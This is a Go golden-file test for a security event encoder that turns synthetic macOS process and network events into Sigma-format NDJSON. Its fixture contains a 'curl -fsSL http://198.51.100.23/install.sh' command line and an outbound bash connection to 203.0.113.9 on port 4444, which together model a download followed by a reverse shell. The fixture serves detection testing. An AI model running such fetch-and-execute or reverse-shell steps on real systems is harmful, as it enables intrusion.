package output

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/rifqifitriady/ZAAFVesper/pkg/event"
)

// exampleFile is the NDJSON used by integrations/zaafelegia/README.md. It is
// produced by EncodeSigma, the encoder behind --elegia-out; regenerate it
// with UPDATE_GOLDEN=1 go test ./pkg/output -run TestElegiaExample.
const exampleFile = "../../integrations/zaafelegia/example/events.ndjson"

func exampleEvents() []*event.Event {
	t0 := time.Date(2026, 11, 9, 8, 30, 0, 0, time.UTC)
	zsh := &event.Proc{PID: 700, Exe: "/bin/zsh", Name: "zsh", Cmdline: "-zsh"}
	return []*event.Event{
		{Seq: 101, Time: t0, Name: event.CreateProcess, Source: "eslogger", Platform: event.PlatformMacOS,
			Proc: &event.Proc{PID: 701, PPID: 700, Exe: "/usr/bin/curl", Name: "curl", Username: "rifqi", Cwd: "/Users/rifqi",
				Cmdline: "curl -fsSL http://198.51.100.23/install.sh", Parent: zsh}},
		{Seq: 102, Time: t0.Add(2 * time.Second), Name: event.NetworkConnect, Source: "netpoll", Platform: event.PlatformMacOS,
			Proc: &event.Proc{PID: 702, PPID: 700, PIDVersion: 7702, UniqueID: 41702, Exe: "/bin/bash", Name: "bash", Username: "rifqi", SigningID: "com.apple.bash", IsPlatform: true, IsSigned: true, CSCategory: "platform"},
			Net:  &event.Net{Proto: "tcp", Direction: "outbound", SrcIP: "192.168.1.20", SrcPort: 50111, DstIP: "203.0.113.9", DstPort: 4444}},
		{Seq: 103, Time: t0.Add(3 * time.Second), Name: event.NetworkConnect, Source: "netpoll", Platform: event.PlatformMacOS,
			Proc: &event.Proc{PID: 703, PPID: 700, Exe: "/usr/bin/python3", Name: "python3", Username: "rifqi"},
			Net:  &event.Net{Proto: "tcp", Direction: "outbound", SrcIP: "192.168.1.20", SrcPort: 50112, DstIP: "151.101.0.223", DstPort: 443}},
		{Seq: 104, Time: t0.Add(4 * time.Second), Name: event.Fork, Source: "eslogger", Platform: event.PlatformMacOS,
			Proc: &event.Proc{PID: 704, PPID: 702, Exe: "/bin/bash", Name: "bash", Username: "rifqi"}},
	}
}

func TestElegiaExample(t *testing.T) {
	var buf bytes.Buffer
	for _, e := range exampleEvents() {
		b, err := EncodeSigma(e, SigmaOptions{DefaultProduct: "macos", Host: "mac-01"}, 0)
		if err != nil {
			t.Fatal(err)
		}
		buf.Write(b)
		buf.WriteByte('\n')
	}
	if os.Getenv("UPDATE_GOLDEN") == "1" {
		if err := os.WriteFile(filepath.Clean(exampleFile), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	got, err := os.ReadFile(exampleFile)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, buf.Bytes()) {
		t.Fatalf("%s is out of date; run UPDATE_GOLDEN=1 go test ./pkg/output -run TestElegiaExample", exampleFile)
	}
}
